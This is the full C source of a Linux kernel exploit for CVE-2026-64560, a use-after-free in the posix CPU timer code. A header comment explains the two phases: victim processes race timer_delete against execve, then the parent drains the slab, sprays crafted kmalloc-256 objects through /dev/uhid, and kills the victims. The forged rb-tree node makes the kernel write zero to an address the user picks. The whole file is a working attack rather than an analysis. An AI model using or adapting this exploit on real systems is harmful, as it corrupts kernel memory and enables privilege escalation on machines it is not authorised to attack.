/*
 * l64.c - CVE-2026-64560 with the race and the reclaim decoupled.
 *
 * l63 spent 5 s of drain waiting per 8 execs (~0.44 execs/s). A race window
 * that narrow needs orders of magnitude more attempts, so the two phases are
 * separated:
 *
 *   phase 1  many victims in quick succession each run the race (create timers,
 *            in-victim deleters for the wide window, non-leader execve) and
 *            then park in the post-exec image. The parent sweeps every timer id
 *            after each batch, so all objects are freed and nothing pins a slab.
 *            A victim that hit the race keeps a dangling timerqueue_node in its
 *            own signal_struct while it parks.
 *   phase 2  once every victim has parked, wait for the empty posix_timers_cache
 *            slabs to reach the buddy allocator, spray order-1 kmalloc-256
 *            objects via /dev/uhid, then kill every victim at once. Each exit
 *            runs posix_cpu_timers_exit_group -> timerqueue_del -> rb_erase on
 *            the dangling node, which is now our data.
 *
 * The erased node is crafted so __rb_erase_augmented takes the "only left
 * child" branch and executes tmp->__rb_parent_color = pc, i.e. *(TARGET) = 0:
 *     node+0x00 __rb_parent_color = 0
 *     node+0x08 rb_right          = 0
 *     node+0x10 rb_left           = TARGET
 * with the node placed at both residues a 384-byte object can occupy inside a
 * 256-byte kmalloc-256 object (obj+112 and obj+240).
 *
 * usage: l64 <batch> <batches> <timers> <uhid> <target> <drain_ms> <child_life_s>
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define CLK_PROC_CPU 2
#define NDEL         4
#define MAXV         1024
#define MAX_TIMERS   256

#define FAKE_AT_96   112
#define FAKE_AT_224  240
#define UHID_RD_SIZE 256
#define UHID_CREATE2 11
#define EVENT_SIZE   4380
#define CREATE2_OFF  4
#define BUS_USB      0x03

static unsigned long long g_target;
static int *g_ids;                 /* MAXV * MAX_TIMERS */
static volatile int *g_nids;       /* MAXV */
static volatile int *g_go;         /* MAXV */
static volatile int *g_delgo;      /* MAXV */

static void *exec_thread(void *arg)
{
    int idx = (int)(long)arg;
    while (!g_go[idx]) sched_yield();
    char *const av[] = { (char *)"/proc/self/exe", (char *)"--child", NULL };
    char *const ep[] = { NULL };
    execve(av[0], av, ep);
    _exit(7);
}

struct delarg { int idx, widx, n; int *ids; };

static void *victim_deleter(void *arg)
{
    struct delarg *d = arg;
    while (!g_delgo[d->idx]) sched_yield();
    for (int i = d->widx; i < d->n; i += NDEL)
        syscall(111 /*timer_delete*/, d->ids[i]);
    return NULL;
}

static long long now_ms(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    if (!f) return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static unsigned char g_ev[EVENT_SIZE];
static unsigned char g_desc[UHID_RD_SIZE];
static int *g_fds;

static int uhid_spray(int n)
{
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fd < 0) break;
        memset(g_ev, 0, sizeof g_ev);
        *(uint32_t *)g_ev = UHID_CREATE2;
        unsigned char *c2 = g_ev + CREATE2_OFF;
        snprintf((char *)c2, 128, "lh64_%d", i);
        *(uint16_t *)(c2 + 256) = UHID_RD_SIZE;
        *(uint16_t *)(c2 + 258) = BUS_USB;
        *(uint32_t *)(c2 + 260) = 0x1234;
        *(uint32_t *)(c2 + 264) = (uint32_t)i;
        memcpy(c2 + 276, g_desc, UHID_RD_SIZE);
        if (write(fd, g_ev, sizeof g_ev) != (ssize_t)sizeof g_ev) { close(fd); break; }
        g_fds[made++] = fd;
    }
    return made;
}

static void victim_body(int idx, int ntimer, int life_s)
{
    int *ids = g_ids + (size_t)idx * MAX_TIMERS;
    signal(SIGUSR1, SIG_IGN);

    int made = 0;
    for (; made < ntimer; made++) {
        struct sigevent ev;
        struct itimerspec its;
        int id = -1;
        memset(&ev, 0, sizeof ev);
        ev.sigev_notify = SIGEV_SIGNAL;
        ev.sigev_signo = SIGUSR1;
        if (syscall(107 /*timer_create*/, CLK_PROC_CPU, &ev, &id) != 0) break;
        memset(&its, 0, sizeof its);
        its.it_value.tv_sec = 3600;
        if (syscall(110 /*timer_settime*/, id, 0, &its, NULL) != 0) break;
        ids[made] = id;
    }
    g_nids[idx] = made;
    if (made < 2) _exit(3);

    pthread_t eth;
    pthread_create(&eth, NULL, exec_thread, (void *)(long)idx);

    pthread_t dth[NDEL];
    struct delarg da[NDEL];
    for (int i = 0; i < NDEL; i++) {
        da[i].idx = idx; da[i].widx = i; da[i].n = made; da[i].ids = ids;
        pthread_create(&dth[i], NULL, victim_deleter, &da[i]);
    }
    sched_yield();
    g_delgo[idx] = 1;
    sched_yield();
    g_go[idx] = 1;
    for (;;) pause();
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--child")) {
        signal(SIGUSR1, SIG_IGN);
        int life = getenv("L64_LIFE") ? atoi(getenv("L64_LIFE")) : 120;
        usleep((useconds_t)life * 1000000);
        _exit(0);
    }

    int batch    = argc > 1 ? atoi(argv[1]) : 32;
    int batches  = argc > 2 ? atoi(argv[2]) : 16;
    int ntimer   = argc > 3 ? atoi(argv[3]) : 192;
    int nuhid    = argc > 4 ? atoi(argv[4]) : 16000;
    if (argc > 5) g_target = strtoull(argv[5], NULL, 0);
    int drain_ms = argc > 6 ? atoi(argv[6]) : 5000;
    int life     = argc > 7 ? atoi(argv[7]) : 120;

    if (batch * batches > MAXV) batches = MAXV / (batch > 0 ? batch : 1);
    if (ntimer > MAX_TIMERS) ntimer = MAX_TIMERS;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }
    char envbuf[32];
    snprintf(envbuf, sizeof envbuf, "%d", life);
    setenv("L64_LIFE", envbuf, 1);

    size_t idsz = (size_t)MAXV * MAX_TIMERS * sizeof(int);
    char *shm = mmap(NULL, idsz + 8192, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED) { printf("mmap failed\n"); return 1; }
    g_ids   = (int *)shm;
    g_nids  = (volatile int *)(shm + idsz);
    g_go    = (volatile int *)(shm + idsz + 2048);
    g_delgo = (volatile int *)(shm + idsz + 4096);
    g_fds   = calloc(nuhid + 8, sizeof(int));

    memset(g_desc, 0, sizeof g_desc);
    memcpy(g_desc + FAKE_AT_96, &g_target, 8);
    memcpy(g_desc + FAKE_AT_224, &g_target, 8);

    int total = batch * batches;
    printf("l64 target=%#llx victims=%d (%dx%d) timers=%d uhid=%d drain=%dms life=%ds\n",
           g_target, total, batch, batches, ntimer, nuhid, drain_ms, life);
    fflush(stdout);

    pid_t *vp = calloc((size_t)total, sizeof(pid_t));
    long long t_start = now_ms();
    int g = 0;

    for (int b = 0; b < batches; b++) {
        int lo = g;
        for (int j = 0; j < batch && g < total; j++, g++) {
            g_go[g] = 0; g_delgo[g] = 0; g_nids[g] = 0;
            pid_t v = fork();
            if (v == 0) victim_body(g, ntimer, life);
            vp[g] = v;
        }
        usleep(250 * 1000);          /* race + exec land in here */
        long long sw = 0, sf = 0, sn = 0;
        for (int round = 0; round < 3; round++) {
            for (int i = lo; i < g; i++) {
                int n = g_nids[i];
                if (round == 0) sn += n;
                int *ids = g_ids + (size_t)i * MAX_TIMERS;
                for (int k = 0; k < n; k++) {
                    if (syscall(111 /*timer_delete*/, ids[k]) == 0) sw++;
                    else if (round == 0) {
                        if (sf == 0) printf("  [diag] first fail errno=%d (%s)\n", errno, strerror(errno));
                        sf++;
                    }
                }
            }
            if (round == 0) { usleep(400 * 1000); }
        }
        printf("  [diag] made=%lld del_ok=%lld del_fail=%lld\n", sn, sw, sf);
        if ((b + 1) % 4 == 0 || b + 1 == batches) {
            int a = -1, t = -1;
            read_posix_slab(&a, &t);
            printf("  batch=%d/%d victims=%d swept=%lld slab=%d/%d t=%.1fs\n",
                   b + 1, batches, g, sw, a, t, (now_ms() - t_start) / 1000.0);
            fflush(stdout);
        }
    }

    printf("phase1 done: %d victims launched in %.1fs (%.1f execs/s)\n",
           total, (now_ms() - t_start) / 1000.0,
           total / ((now_ms() - t_start) / 1000.0));
    fflush(stdout);

    /* phase 2: let empty slabs reach the buddy allocator, then take them */
    long long t0 = now_ms();
    int a = -1, t = -1;
    while (now_ms() - t0 < drain_ms) {
        usleep(120 * 1000);
        read_posix_slab(&a, &t);
        if (now_ms() - t0 >= 1500 && t < 800) break;
    }
    printf("drained slab=%d/%d after %.1fs\n", a, t, (now_ms() - t0) / 1000.0);
    fflush(stdout);

    int made = uhid_spray(nuhid);
    printf("uhid spray=%d\n", made);
    fflush(stdout);

    int killed = 0;
    for (int i = 0; i < total; i++)
        if (vp[i] > 0) { kill(vp[i], SIGKILL); killed++; }
    printf("killed=%d (harvest)\n", killed);
    fflush(stdout);
    usleep(400 * 1000);
    printf("SURVIVED\n");
    return 0;
}


